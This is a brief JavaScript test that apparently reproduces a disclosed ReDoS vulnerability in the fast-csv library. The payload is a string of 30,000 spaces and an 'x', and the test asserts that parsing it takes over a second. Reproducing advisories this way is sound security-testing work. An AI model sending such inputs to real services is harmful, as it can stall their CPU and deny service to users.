//https://snyk.io/vuln/SNYK-JS-FASTCSV-1049538
test("ReDos in fast-csv", () => {
  const csv = require("fast-csv");

  let str1 = " ".repeat(30000) + "x\n";

  let start = process.hrtime();

  const stream = csv
    .parse({ ignoreEmpty: true, delimiter: "\t" })
    .on("error", (error) => {})
    .on("data", () => {})
    .on("end", () => {
      var t = process.hrtime(start);
      let time = t[0] + t[1] / 1000000000;

      expect(time).toBeGreaterThan(1);
    });

  stream.write(str1);
  stream.end();
});
